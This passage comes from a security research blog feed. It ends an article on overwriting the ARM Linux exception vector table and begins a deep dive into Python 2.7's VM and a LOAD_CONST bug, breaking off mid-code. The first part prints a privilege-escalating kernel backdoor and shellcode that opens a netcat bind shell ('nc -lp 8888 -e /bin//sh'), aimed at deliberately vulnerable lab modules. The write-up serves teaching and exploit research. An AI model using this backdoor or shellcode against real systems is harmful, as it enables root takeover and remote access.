3. When a system call occurs, our backdoor will check if r7 == 0xb0000000 and if true, elevate the privileges of the calling process otherwise jump to the normal system call handler.  
</code></pre>

<p>Here is the backdoor&rsquo;s code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="err">@</span> <span class="nf">check</span> <span class="nv">if</span> <span class="nv">magic</span>
</span><span class='line'>    <span class="nf">cmp</span>     <span class="nv">r7</span><span class="p">,</span> <span class="err">#</span><span class="mh">0xb0000000</span>
</span><span class='line'>    <span class="nf">bne</span>     <span class="nv">exit</span>
</span><span class='line'>
</span><span class='line'><span class="nl">elevate:</span>
</span><span class='line'>    <span class="nf">stmfd</span>   <span class="nb">sp</span><span class="err">!</span><span class="p">,</span><span class="err">{</span><span class="nv">r0</span><span class="o">-</span><span class="nv">r12</span><span class="err">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="nf">mov</span>     <span class="nv">r0</span><span class="p">,</span> <span class="err">#</span><span class="mi">0</span>
</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">r3</span><span class="p">,</span> <span class="err">=</span><span class="mh">0xc0049a00</span>     <span class="err">@</span> <span class="nv">prepare_kernel_cred</span>
</span><span class='line'>    <span class="nf">blx</span>     <span class="nv">r3</span>
</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">r4</span><span class="p">,</span> <span class="err">=</span><span class="mh">0xc0049438</span>     <span class="err">@</span> <span class="nv">commit_creds</span>
</span><span class='line'>    <span class="nf">blx</span>     <span class="nv">r4</span>
</span><span class='line'>
</span><span class='line'>    <span class="nf">ldmfd</span>   <span class="nb">sp</span><span class="err">!</span><span class="p">,</span> <span class="err">{</span><span class="nv">r0</span><span class="o">-</span><span class="nv">r12</span><span class="p">,</span> <span class="nv">pc</span><span class="err">}</span><span class="o">^</span>  <span class="err">@</span> <span class="nv">return</span> <span class="nv">to</span> <span class="nv">userland</span>
</span><span class='line'>
</span><span class='line'><span class="err">@</span> <span class="nf">go</span> <span class="nv">to</span> <span class="nv">syscall</span> <span class="nv">handler</span>
</span><span class='line'><span class="nl">exit:</span>
</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">pc</span><span class="p">,</span> <span class="p">[</span><span class="nv">pc</span><span class="p">,</span> <span class="err">#</span><span class="mi">980</span><span class="p">]</span>      <span class="err">@</span> <span class="nv">go</span> <span class="nv">to</span> <span class="nv">normal</span> <span class="nv">swi</span> <span class="nv">handler</span>
</span></code></pre></td></tr></table></div></figure>


<p>You can find the complete code for the vulnerable module and the exploit <a href="https://github.com/acama/arm-evt/tree/master/local_example">here</a>. Run the exploit:<br/>
<img src="http://doar-e.github.io/images/corrupting_arm_evt/local_poc.png" alt="Local PoC" /></p>

<h2>Remote scenario</h2>

<p>For this example, we will use a netfilter module with a similar vulnerability as the previous one:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">if</span><span class="p">(</span><span class="n">ip</span><span class="o">-&gt;</span><span class="n">protocol</span> <span class="o">==</span> <span class="n">IPPROTO_TCP</span><span class="p">){</span>
</span><span class='line'>    <span class="n">tcp</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">tcphdr</span> <span class="o">*</span><span class="p">)(</span><span class="n">skb_network_header</span><span class="p">(</span><span class="n">skb</span><span class="p">)</span> <span class="o">+</span> <span class="n">ip_hdrlen</span><span class="p">(</span><span class="n">skb</span><span class="p">));</span>
</span><span class='line'>    <span class="n">currport</span> <span class="o">=</span> <span class="n">ntohs</span><span class="p">(</span><span class="n">tcp</span><span class="o">-&gt;</span><span class="n">dest</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span><span class="p">((</span><span class="n">currport</span> <span class="o">==</span> <span class="mi">9999</span><span class="p">)){</span>
</span><span class='line'>        <span class="n">tcp_data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)((</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">tcp</span> <span class="o">+</span> <span class="p">(</span><span class="n">tcp</span><span class="o">-&gt;</span><span class="n">doff</span> <span class="o">*</span> <span class="mi">4</span><span class="p">));</span>
</span><span class='line'>        <span class="n">where</span> <span class="o">=</span> <span class="p">((</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="n">tcp_data</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
</span><span class='line'>        <span class="n">len</span> <span class="o">=</span> <span class="p">((</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">tcp_data</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">where</span><span class="p">)))[</span><span class="mi">0</span><span class="p">];</span>
</span><span class='line'>        <span class="n">what</span> <span class="o">=</span> <span class="n">tcp_data</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">where</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">len</span><span class="p">);</span>
</span><span class='line'>        <span class="n">memcpy</span><span class="p">(</span><span class="n">where</span><span class="p">,</span> <span class="n">what</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Just like the previous example, this module has an awesome feature that allows you to write data to anywhere you want. Connect on port tcp/9999 and just give it an address, followed by the size of the data and the actual data to write there. In this case we will also backdoor the kernel by overwriting the SWI exception vector and backdooring the kernel. The code will branch to our shellcode which we will also, as in the previous example, store at <em>0xffff020</em>. Overwriting the SWI vector is especially a good idea in this remote scenario because it will allow us to switch from interrupt context to process context. So our backdoor will be executing in a context with a backing process and we will be able to &ldquo;hijack&rdquo; this process and overwrite its code segment with a bind shell or connect back shell. But let&rsquo;s not do it that way. Let&rsquo;s check something real quick:<br/>
<img src="http://doar-e.github.io/images/corrupting_arm_evt/proc_self_maps.png" alt="cat /proc/self/maps" /><br/>
Would you look at that, on top of everything else, the EVT is a shared memory segment. It is executable from user land and writeable from kernel land*. Instead of overwriting the code segment of a process that is making a system call, let&rsquo;s just store our code in the EVT right after our first stage and just return there.
Every system call goes through the SWI vector so we won&rsquo;t have to wait too much for a process to get caught in our trap.</p>

<h3>The Exploit</h3>

<p>Our exploit goes:</p>

<pre><code>1. Store our first stage and second stage shellcodes at *0xffff0020* (one after the other).  
2. Overwrite the SWI exception vector with a branch to *0xffff0020*.  
3. When a system call occurs, our first stage shellcode will set the link register to the address of our second stage shellcode (which is also stored in the EVT and which will be executed from userland), and then return to userland.  
4. The calling process will "resume execution" at the address of our second stage which is just a bind shell.  
</code></pre>

<p>Here is the stage 1-2 shellcode:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="nl">stage_1:</span>
</span><span class='line'>    <span class="nf">adr</span>     <span class="nv">lr</span><span class="p">,</span> <span class="nv">stage_2</span>
</span><span class='line'>    <span class="nf">push</span>    <span class="err">{</span><span class="nv">lr</span><span class="err">}</span>
</span><span class='line'>    <span class="nf">stmfd</span>   <span class="nb">sp</span><span class="err">!</span><span class="p">,</span> <span class="err">{</span><span class="nv">r0</span><span class="o">-</span><span class="nv">r12</span><span class="err">}</span>
</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">r0</span><span class="p">,</span> <span class="err">=</span><span class="mh">0xe59ff410</span>     <span class="err">@</span> <span class="nv">intial</span> <span class="nv">value</span> <span class="nv">at</span> <span class="mh">0xffff0008</span> <span class="nv">which</span> <span class="nv">is</span>
</span><span class='line'>                                <span class="err">@</span> <span class="nf">ldr</span>     <span class="nv">pc</span><span class="p">,</span> <span class="p">[</span><span class="nv">pc</span><span class="p">,</span> <span class="err">#</span><span class="mi">1040</span><span class="p">]</span> <span class="c1">; 0xffff0420</span>
</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">r1</span><span class="p">,</span> <span class="err">=</span><span class="mh">0xffff0008</span>
</span><span class='line'>    <span class="nf">str</span>     <span class="nv">r0</span><span class="p">,</span> <span class="p">[</span><span class="nv">r1</span><span class="p">]</span>
</span><span class='line'>    <span class="nf">ldmfd</span>   <span class="nb">sp</span><span class="err">!</span><span class="p">,</span> <span class="err">{</span><span class="nv">r0</span><span class="o">-</span><span class="nv">r12</span><span class="p">,</span> <span class="nv">pc</span><span class="err">}</span><span class="o">^</span>  <span class="err">@</span> <span class="nv">return</span> <span class="nv">to</span> <span class="nv">userland</span>
</span><span class='line'>
</span><span class='line'><span class="nl">stage_2:</span>
</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">r0</span><span class="p">,</span> <span class="err">=</span><span class="mh">0x6e69622f</span>     <span class="err">@</span> <span class="o">/</span><span class="nv">bin</span>
</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">r1</span><span class="p">,</span> <span class="err">=</span><span class="mh">0x68732f2f</span>     <span class="err">@</span> <span class="o">/</span><span class="nv">sh</span>
</span><span class='line'>    <span class="nf">eor</span>     <span class="nv">r2</span><span class="p">,</span> <span class="nv">r2</span><span class="p">,</span> <span class="nv">r2</span>          <span class="err">@</span> <span class="mh">0x00000000</span>
</span><span class='line'>    <span class="nf">push</span>    <span class="err">{</span><span class="nv">r0</span><span class="p">,</span> <span class="nv">r1</span><span class="p">,</span> <span class="nv">r2</span><span class="err">}</span>
</span><span class='line'>    <span class="nf">mov</span>     <span class="nv">r0</span><span class="p">,</span> <span class="nb">sp</span>
</span><span class='line'>
</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">r4</span><span class="p">,</span> <span class="err">=</span><span class="mh">0x0000632d</span>     <span class="err">@</span> <span class="o">-</span><span class="nv">c</span><span class="err">\</span><span class="nv">x00</span><span class="err">\</span><span class="nv">x00</span>
</span><span class='line'>    <span class="nf">push</span>    <span class="err">{</span><span class="nv">r4</span><span class="err">}</span>
</span><span class='line'>    <span class="nf">mov</span>     <span class="nv">r4</span><span class="p">,</span> <span class="nb">sp</span>
</span><span class='line'>
</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">r5</span><span class="p">,</span> <span class="err">=</span><span class="mh">0x2d20636e</span>
</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">r6</span><span class="p">,</span> <span class="err">=</span><span class="mh">0x3820706c</span>
</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">r7</span><span class="p">,</span> <span class="err">=</span><span class="mh">0x20383838</span>     <span class="err">@</span> <span class="nv">nc</span> <span class="o">-</span><span class="nv">lp</span> <span class="mi">8888</span> <span class="o">-</span><span class="nv">e</span> <span class="o">/</span><span class="nv">bin</span><span class="o">//</span><span class="nv">sh</span>
</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">r8</span><span class="p">,</span> <span class="err">=</span><span class="mh">0x2f20652d</span>
</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">r9</span><span class="p">,</span> <span class="err">=</span><span class="mh">0x2f6e6962</span>
</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">r10</span><span class="p">,</span> <span class="err">=</span><span class="mh">0x68732f2f</span>
</span><span class='line'>
</span><span class='line'>    <span class="nf">eor</span>     <span class="nv">r11</span><span class="p">,</span> <span class="nv">r11</span><span class="p">,</span> <span class="nv">r11</span>
</span><span class='line'>    <span class="nf">push</span>    <span class="err">{</span><span class="nv">r5</span><span class="o">-</span><span class="nv">r11</span><span class="err">}</span>
</span><span class='line'>    <span class="nf">mov</span>     <span class="nv">r5</span><span class="p">,</span> <span class="nb">sp</span>
</span><span class='line'>    <span class="nf">push</span>    <span class="err">{</span><span class="nv">r2</span><span class="err">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="nf">eor</span>     <span class="nv">r6</span><span class="p">,</span> <span class="nv">r6</span><span class="p">,</span> <span class="nv">r6</span>
</span><span class='line'>    <span class="nf">push</span>    <span class="err">{</span><span class="nv">r0</span><span class="p">,</span><span class="nv">r4</span><span class="p">,</span><span class="nv">r5</span><span class="p">,</span> <span class="nv">r6</span><span class="err">}</span>
</span><span class='line'>    <span class="nf">mov</span>     <span class="nv">r1</span><span class="p">,</span> <span class="nb">sp</span>
</span><span class='line'>    <span class="nf">mov</span>     <span class="nv">r7</span><span class="p">,</span> <span class="err">#</span><span class="mi">11</span>
</span><span class='line'>    <span class="nf">swi</span>     <span class="mh">0x0</span>
</span><span class='line'>
</span><span class='line'>    <span class="nf">mov</span>     <span class="nv">r0</span><span class="p">,</span> <span class="err">#</span><span class="mi">99</span>
</span><span class='line'>    <span class="nf">mov</span>     <span class="nv">r7</span><span class="p">,</span> <span class="err">#</span><span class="mi">1</span>
</span><span class='line'>    <span class="nf">swi</span>     <span class="mh">0x0</span>
</span></code></pre></td></tr></table></div></figure>


<p>You can find the complete code for the vulnerable module and the exploit <a href="https://github.com/acama/arm-evt/tree/master/remote_example">here</a>. Run the exploit:<br/>
<img src="http://doar-e.github.io/images/corrupting_arm_evt/remote_poc.png" alt="Remote PoC" /></p>

<h2>Bonus: Interrupt Stack Overflow</h2>

<p>It seems like the Interrupt Stack is adjacent to the EVT in most memory layouts. Who knows what kind of interesting things would happen if there was something like a stack overflow ?</p>

<h1>A Few Things about all this</h1>

<ul>
<li>The techniques discussed in this article make the assumption that the attack has knowledge of the kernel addresses which might not always be the case.</li>
<li>The location where we are storing our shellcode (<em>0xffff0020</em>) might or might not be used by another distro&rsquo;s kernel.</li>
<li>The exampe codes I wrote here are merely PoCs; they could definitely be improved. For example, on the remote scenario, if it turns out that the init process is the process being hijacked, the box will crash after we exit from the bind shell.</li>
<li>If you hadn&rsquo;t noticed, the &ldquo;vulnerabilities&rdquo; presented here, aren&rsquo;t really vulnerabilities but that is not the point of this article.</li>
</ul>


<p> *: It seems like the EVT can be mapped read-only and therfore there is the possibility that it might not be writeable in newer/some versions of the Linux kernel.</p>

<h1>Final words</h1>

<p>Among other things, <a href="http://grsecurity.net/">grsec</a> prevents the modification of the EVT by making the page read-only.
If you want to play with some fun kernel challenges checkout the &ldquo;kernelpanic&rdquo; branch on <a href="http://w3challs.com/challenges/wargame">w3challs</a>.<br/>
Cheers, <a href="https://twitter.com/amatcama">@amatcama</a></p>

<h1>References</h1>

<p>[1] <a href="http://cansecwest.com/slides07/Vector-Rewrite-Attack.pdf">Vector Rewrite Attack</a><br/>
[2] <a href="https://forums.grsecurity.net/viewtopic.php?f=7&amp;t=3292">Recent ARM Security Improvements</a><br/>
[3] <a href="http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.ddi0311d/I30195.html">Entering an Exception</a><br/>
[4] <a href="http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.dui0040d/Cacdfeci.html">SWI handlers</a><br/>
[5] <a href="http://osnet.cs.nchu.edu.tw/powpoint/Embedded94_1/Chapter%207%20ARM%20Exceptions.pdf">ARM Exceptions</a><br/>
[6] <a href="http://www.iti.uni-stuttgart.de/~radetzki/Seminar06/08_report.pdf">Exception and Interrupt Handling in ARM</a></p>
]]></content>
    
  </entry>
  
  <entry>
    
    <title type="html"><![CDATA[Deep dive into Python's VM: Story of LOAD_CONST bug]]></title>
    <link href="http://doar-e.github.io/blog/2014/04/17/deep-dive-into-pythons-vm-story-of-load_const-bug/"/>
    
    <updated>2014-04-17T23:22:00-07:00</updated>
    <id>http://doar-e.github.io/blog/2014/04/17/deep-dive-into-pythons-vm-story-of-load_const-bug</id>
    
    <content type="html"><![CDATA[<h1>Introduction</h1>

<p>A year ago, I&rsquo;ve written a Python script to leverage a bug in Python&rsquo;s virtual machine: the idea was to fully control the Python virtual processor and after that to instrument the VM to execute native codes. The <a href="https://github.com/0vercl0k/stuffz/blob/master/Python's%20internals/python27_abuse_vm_to_execute_x86_code.py">python27_abuse_vm_to_execute_x86_code.py</a> script wasn&rsquo;t really self-explanatory, so I believe only a few people actually took some time to understood what happened under the hood. The purpose of this post is to give you an explanation of the bug, how you can control the VM and how you can turn the bug into something that can be more useful. It&rsquo;s also a cool occasion to see how works the Python virtual machine from a low-level perspective: what we love so much right?</p>

<p>But before going further, I just would like to clarify a couple of things:</p>

<ul>
<li>I haven&rsquo;t found this bug, this is quite old and <strong>known</strong> by the Python developers (trading safety for performance), so don&rsquo;t panic this is <strong>not</strong> a 0day or a new bug ; can be a cool CTF trick though</li>
<li>Obviously, YES I know we can also &ldquo;escape&rdquo; the virtual machine with the <a href="http://docs.python.org/2/library/ctypes.html">ctypes</a> module ; but this is a feature not a bug. In addition, ctypes is always &ldquo;removed&rdquo;  from sandbox implementation in Python</li>
</ul>


<p>Also, keep in mind I will focus Python 2.7.5 x86 on Windows ; but obviously this is adaptable for other systems and architectures, so this is left as an exercise to the interested readers.
All right, let&rsquo;s move on to the first part: this one will focus the essentials about the VM, and Python objects.</p>

<div class='entry-content-toc'></div>




<!--more-->


<h1>The Python virtual processor</h1>

<h2>Introduction</h2>

<p>As you know, Python is a (really cool) scripting language interpreted, and the source of the official interpreter is available here: <a href="http://www.python.org/ftp/python/2.7.6/Python-2.7.6.tgz">Python-2.7.6.tgz</a>. The project is written in C, and it is really readable ; so please download the sources, read them, you will learn a lot of things.
Now all the Python code you write is being <em>compiled</em>, at some point, into some &ldquo;bytecodes&rdquo;: let&rsquo;s say it&rsquo;s exactly the same when your C codes are compiled into x86 code. But the cool thing for us, is that the Python architecture is far more simpler than x86.</p>

<p>Here is a partial list of all available opcodes in Python 2.7.5:</p>

<figure class='code'><figcaption><span>Python275 available opcodes</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>In [5]: len(opcode.opmap.keys())
</span><span class='line'>Out[5]: 119
</span><span class='line'>In [4]: opcode.opmap.keys()
</span><span class='line'>Out[4]: [
</span><span class='line'> &#39;CALL_FUNCTION&#39;,
</span><span class='line'> &#39;DUP_TOP&#39;,
</span><span class='line'> &#39;INPLACE_FLOOR_DIVIDE&#39;,
</span><span class='line'> &#39;MAP_ADD&#39;,
</span><span class='line'> &#39;BINARY_XOR&#39;,
</span><span class='line'> &#39;END_FINALLY&#39;,
</span><span class='line'> &#39;RETURN_VALUE&#39;,
</span><span class='line'> &#39;POP_BLOCK&#39;,
</span><span class='line'> &#39;SETUP_LOOP&#39;,
</span><span class='line'> &#39;BUILD_SET&#39;,
</span><span class='line'> &#39;POP_TOP&#39;,
</span><span class='line'> &#39;EXTENDED_ARG&#39;,
</span><span class='line'> &#39;SETUP_FINALLY&#39;,
</span><span class='line'> &#39;INPLACE_TRUE_DIVIDE&#39;,
</span><span class='line'> &#39;CALL_FUNCTION_KW&#39;,
</span><span class='line'> &#39;INPLACE_AND&#39;,
</span><span class='line'> &#39;SETUP_EXCEPT&#39;,
</span><span class='line'> &#39;STORE_NAME&#39;,
</span><span class='line'> &#39;IMPORT_NAME&#39;,
</span><span class='line'> &#39;LOAD_GLOBAL&#39;,
</span><span class='line'> &#39;LOAD_NAME&#39;,
</span><span class='line'> ...
</span><span class='line'>]
</span></code></pre></td></tr></table></div></figure>


<h2>The virtual machine</h2>

<p>The Python VM is fully implemented in the function <a href="https://github.com/python-git/python/blob/master/Python/ceval.c#L667">PyEval_EvalFrameEx</a> that you can find in the <a href="https://github.com/python-git/python/blob/master/Python/ceval.c">ceval.c</a> file. The machine is built with a simple loop handling opcodes one-by-one with a bunch of switch-cases:</p>

<figure class='code'><figcaption><span>Python VM</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">PyObject</span> <span class="o">*</span>
</span><span class='line'><span class="nf">PyEval_EvalFrameEx</span><span class="p">(</span><span class="n">PyFrameObject</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">int</span> <span class="n">throwflag</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="c1">//...</span>
</span><span class='line'>  <span class="nl">fast_next_opcode:</span>
</span><span class='line'>  <span class="c1">//...</span>
</span><span class='line'>  <span class="cm">/* Extract opcode and argument */</span>
</span><span class='line'>  <span class="n">opcode</span> <span class="o">=</span> <span class="n">NEXTOP</span><span class="p">();</span>
</span><span class='line'>  <span class="n">oparg</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">HAS_ARG</span><span class="p">(</span><span class="n">opcode</span><span class="p">))</span>
</span><span class='line'>    <span class="n">oparg</span> <span class="o">=</span> <span class="n">NEXTARG</span><span class="p">();</span>
</span><span class='line'>  <span class="c1">//...</span>
</span><span class='line'>  <span class="k">switch</span> <span class="p">(</span><span class="n">opcode</span><span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="k">case</span> <span class="n">NOP</span>:
</span><span class='line'>      <span class="k">goto</span> <span class="n">fast_next_opcode</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">case</span> <span class="n">LOAD_FAST</span>:
</span><span class='line'>      <span class="n">x</span> <span class="o">=</span> <span class="n">GETLOCAL</span><span class="p">(</span><span class="n">oparg</span><span class="p">);</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="n">x</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">Py_INCREF</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
</span><span class='line'>        <span class="n">PUSH</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
</span><span class='line'>        <span class="k">goto</span> <span class="n">fast_next_opcode</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>      <span class="n">format_exc_check_arg</span><span class="p">(</span><span class="n">PyExc_UnboundLocalError</span><span class="p">,</span>
</span><span class='line'>        <span class="n">UNBOUNDLOCAL_ERROR_MSG</span><span class="p">,</span>
</span><span class='line'>        <span class="n">PyTuple_GetItem</span><span class="p">(</span><span class="n">co</span><span class="o">-&gt;</span><span class="n">co_varnames</span><span class="p">,</span> <span class="n">oparg</span><span class="p">));</span>
</span><span class='line'>      <span class="k">break</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">case</span> <span class="n">LOAD_CONST</span>:
</span><span class='line'>      <span class="n">x</span> <span class="o">=</span> <span class="n">GETITEM</span><span class="p">(</span><span class="n">consts</span><span class="p">,</span> <span class="n">oparg</span><span class="p">);</span>
</span><span class='line'>      <span class="n">Py_INCREF</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
</span><span class='line'>      <span class="n">PUSH</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
</span><span class='line'>      <span class="k">goto</span> <span class="n">fast_next_opcode</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">case</span> <span class="n">STORE_FAST</span>:
</span><span class='line'>      <span class="n">v</span> <span class="o">=</span> <span class="n">POP</span><span class="p">();</span>
</span><span class='line'>      <span class="n">SETLOCAL</span><span class="p">(</span><span class="n">oparg</span><span class="p">,</span> <span class="n">v</span><span class="p">);</span>
</span><span class='line'>      <span class="k">goto</span> <span class="n">fast_next_opcode</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">//...</span>
</span><span class='line'>  <span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The machine also uses a virtual stack to pass/return object to the different opcodes. So it really looks like an architecture we are used to dealing with, nothing exotic.</p>

<h2>Everything is an object</h2>

<p>The first rule of the VM is that it handles only Python objects. A Python object is basically made of two parts:</p>

<ul>
<li>The first one is a header, this header is mandatory for all the objects. Defined like that:</li>
</ul>


<figure class='code'><figcaption><span>Python object header</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#define PyObject_HEAD                   \</span>
</span><span class='line'><span class="cp">  _PyObject_HEAD_EXTRA                \</span>
</span><span class='line'><span class="cp">  Py_ssize_t ob_refcnt;               \</span>
</span><span class='line'><span class="cp">  struct _typeobject *ob_type;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define PyObject_VAR_HEAD               \</span>
</span><span class='line'><span class="cp">  PyObject_HEAD                       \</span>
</span><span class='line'><span class="cp">  Py_ssize_t ob_size; </span><span class="cm">/* Number of items in variable part */</span><span class="cp"></span>
</span></code></pre></td></tr></table></div></figure>


<ul>
<li>The second one is the variable part that describes the specifics of your object. Here is for example <em>PyStringObject</em>:</li>
</ul>


<figure class='code'><figcaption><span>PyStringObject</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">PyObject_VAR_HEAD</span>
</span><span class='line'>  <span class="kt">long</span> <span class="n">ob_shash</span><span class="p">;</span>
